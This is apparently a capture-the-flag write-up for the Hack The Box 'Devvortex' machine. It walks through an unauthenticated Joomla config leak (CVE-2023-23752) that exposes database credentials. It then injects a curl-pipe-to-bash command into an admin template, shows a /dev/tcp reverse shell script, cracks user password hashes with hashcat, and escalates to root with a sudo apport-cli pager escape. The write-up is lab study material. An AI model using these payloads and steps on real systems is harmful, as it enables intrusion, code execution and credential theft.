# Initial 
Nmap ports tcp scan
![[screenshot-2025-01-23-04-27-52.png]]

Nmap services scan
![[Pasted image 20250122233155.png]]
whatweb
```bash
whatweb http://devvortex.htb
http://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
# Sub domain fuzzing


![[Pasted image 20250122235341.png]]

# Routes
have joomla cms version 4.2.6 CVE-2023-23752

http://dev.devvortex.htb/api/index.php/v1/config/application?public=true

```json
{
    "type": "application",
    "id": "224",
    "attributes": {
    "user": "lewis",
    "id": 224
}
},
{
    "type": "application",
    "id": "224",
    "attributes": {
    "password": "P4ntherg0t1n5r3c0n##",
    "id": 224
}
```
# Revshell

http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L2Vycm9yLnBocA&isMedia=0

add 
system("curl 10.10.14.14:9080/rev.sh|bash");

python3 -m http.server 9080

create file rev.sh
```bash
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.14/9080 0>&1
```


# Privilege scalation

```bash
mysql -u lewis -p

use joomla;
select * from sd4fg_users;

hashid hash
hashcat -m 3200 /usr/share/wordlists/rockyou.txt
```

change user logan 
Credentials:
logan:tequieromucho
```
ssh logan@ip
cat user.txt
sudo -l 
sudo /usr/bin/apport-cli -f -p <PID sysmtemd
```

we preceed to select view report and since ```less``` is configured as the default pager we can run ```!/bin/bash ```

cat root.txt









